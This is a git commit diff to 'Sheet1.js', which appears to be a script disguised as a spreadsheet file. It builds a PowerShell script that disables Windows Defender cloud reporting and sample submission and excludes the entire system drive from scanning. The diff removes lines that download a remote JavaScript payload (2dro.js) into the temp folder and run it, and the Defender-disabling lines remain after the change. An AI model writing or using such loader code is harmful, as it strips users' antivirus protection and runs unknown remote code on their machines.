950b48b57caf959c1a0c73441c35be3002d347ef
Easy-Hash <easy.hash.business@gmail.com>
2025-10-05 21:34:14 +0200

    Update Sheet1.js

--- Sheet1.js
+++ Sheet1.js
@@ -16,13 +16,7 @@ var psContent =
 'Set-MpPreference -MAPSReporting 0;\n' +
 'Set-MpPreference -SubmitSamplesConsent 2;\n' +
 'Add-MpPreference -ExclusionPath $env:SystemDrive -ErrorAction Stop;\n' +
-'\n' +
-'Get-MpPreference | Select MAPSReporting, SubmitSamplesConsent, ExclusionPath | Format-List;\n' +
-'\n' +
-'$url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/main/2dro.js";\n' +
-'$destination = "$env:TEMP\\2dro.js";\n' +
-'Invoke-WebRequest -Uri $url -OutFile $destination;\n' +
-'Start-Process $destination;\n';
+'\n';
 
 // Write the PS script to temp
 try {
@@ -48,6 +42,7 @@ try {
 }
 // If you want the temp file removed after the PS window closes, you can add a cleanup step manually.
 WScript.Quit(0);
+
 
 
 
